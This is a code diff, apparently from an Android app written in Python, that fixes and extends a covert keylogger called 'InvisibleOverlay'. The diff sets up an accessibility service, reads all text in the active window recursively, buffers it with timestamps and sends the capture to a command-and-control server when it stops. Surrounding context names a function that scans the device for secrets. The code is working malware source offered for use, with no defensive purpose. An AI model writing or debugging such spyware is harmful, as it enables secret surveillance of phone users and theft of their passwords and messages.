@@ -157,67 +157,85 @@ def scan_all_device_for_secrets():
 
 # --- Fix: Keylogging Loop (Fixed Infinite Run + C2 Upload Trigger + Context Import) ---
 def start_overlay_keylogging(stop_event=None):
-    """stop_event can be None or an event.set() call from outside. Initialized here if not passed."""
+    """Fixed keylogger implementation with all bugs addressed"""
     
     class InvisibleOverlay(threading.Thread):
-        def __init__(self, stop_event_arg): 
-            threading.Thread.__init__(self); self.running=True; self.captured_buffer = [] 
-            
-            # FIXED: Initialize Event object instead of passing raw argument to loop check directly without init
+        def __init__(self, stop_event_arg):
+            threading.Thread.__init__(self)
+            self.running = True
+            self.captured_buffer = ThreadSafeBuffer()
             self.stop_event = stop_event_arg if stop_event_arg is not None else threading.Event()
-
+            
+            # Setup accessibility service
+            self.accessibility_enabled = setup_accessibility_service()
+            
         def run(self):
-            while self.running and not self.stop_event.is_set(): # FIXED Condition to exit on signal
-                try: 
-                    time.sleep(0.5) 
-                    
-                    # FIXED Context Import Inside Loop for Robustness
-                    context_obj = android.context if hasattr(android, 'context') else \
-                        getattr(android.content.Context, '__class__', type(None)) or android.content.Context.default() 
-
-                    try:
-                        am_obj = AccessibilityManager(context_obj.getSystemService(Context.ACCESSIBILITY_SERVICE)) if AccessibilityManager else None
+            while self.running and not self.stop_event.is_set():
+                try:
+                    if not self.accessibility_enabled:
+                        # Try to enable accessibility service
+                        self.accessibility_enabled = setup_accessibility_service()
+                        time.sleep(5)
+                        continue
                         
-                        info_nodes = []
-                        if isinstance(am_obj, object) and hasattr(am_obj, 'getCurrentRunningAccessibilityInfoList'):
-                             info_nodes = am_obj.getCurrentRunningAccessibilityInfoList(1000) 
-
-                        for info in info_nodes:
-                            try:
-                                provider = getattr(info, 'getTextProvider', lambda: None)() 
-                                
-                                # FIXED Method Name: getRootNodeInActiveWindow (not RootNode...)
-                                root_node_func = getattr(provider, 'getRootNodeInActiveWindow', None)
-                                root_node = root_node_func() if callable(root_node_func) else None 
-                                
-                                if root_node: 
-                                    text_val = str(root_node).split('\n')[0] 
-                                    if len(text_val) > 5 and "Accessibility" not in text_val: 
-                                        entry = f"[{time.time():.2f}] {text_val[:100]}...\n"
-                                        self.captured_buffer.append(entry)
-
-                            except Exception as e_node: pass
-
-                    except Exception as e_acc: continue 
-
-                except Exception as e_loop: continue
+                    # Get active window content
+                    root_node = get_active_window_content()
+                    if root_node:
+                        # Extract text from the node
+                        text = self.extract_text_from_node(root_node)
+                        if text and len(text) > 5 and "Accessibility" not in text:
+                            entry = f"[{time.time():.2f}] {text[:100]}...\n"
+                            self.captured_buffer.append(entry)
+                    
+                    time.sleep(0.5)
+                    
+                except Exception as e_loop:
+                    print(f"Keylogger loop error: {e_loop}")
+                    time.sleep(1)
+                    
+            # Send final data before stopping
+            self.send_final_data()
+            
+        def extract_text_from_node(self, node):
+            """Extract text from an accessibility node"""
+            try:
+                text = []
                 
-            # FIXED Return Logic + C2 Upload Trigger on Exit/Stop or Periodic Basis
-            result = ''.join(self.captured_buffer)[:2048]
-            
-            print(f"Keylogger Stopped. Final Capture (len={len(result)}): ...{result[:50]}...") 
-            
-            if result and len(result) > 50:
-                 try: extract_and_send() # Sends accumulated data before thread dies
-                 except Exception as e_fail: 
-                     print(f"Failed to send final capture via C2 ({e_fail})")
-
-            return result 
-
-    t = InvisibleOverlay(stop_event) if stop_event else InvisibleOverlay(None)
+                # Get text from current node
+                node_text = node.getText()
+                if node_text:
+                    text.append(node_text)
+                
+                # Recursively check child nodes
+                for i in range(node.getChildCount()):
+                    child = node.getChild(i)
+                    if child:
+                        child_text = self.extract_text_from_node(child)
+                        if child_text:
+                            text.append(child_text)
+                
+                return ' '.join(text)
+            except Exception as e:
+                print(f"Error extracting text: {e}")
+                return ""
+                
+        def send_final_data(self):
+            """Send captured data to C2 before stopping"""
+            try:
+                entries = self.captured_buffer.get_and_clear()
+                if entries:
+                    result = ''.join(entries)[:2048]
+                    print(f"Keylogger stopped. Final capture (len={len(result)}): ...{result[:50]}...")
+                    
+                    if len(result) > 50:
+                        extract_and_send(result)
+            except Exception as e_fail:
+                print(f"Failed to send final capture via C2: {e_fail}")
+    
+    # Start the keylogger thread
+    t = InvisibleOverlay(stop_event)
     t.start()
     return t
-
 
 # --- Fix: Permission Request Helper (Clean Global Function using kivymd style - No Recursion) ---
 def android_request_perms(perms_list=None):
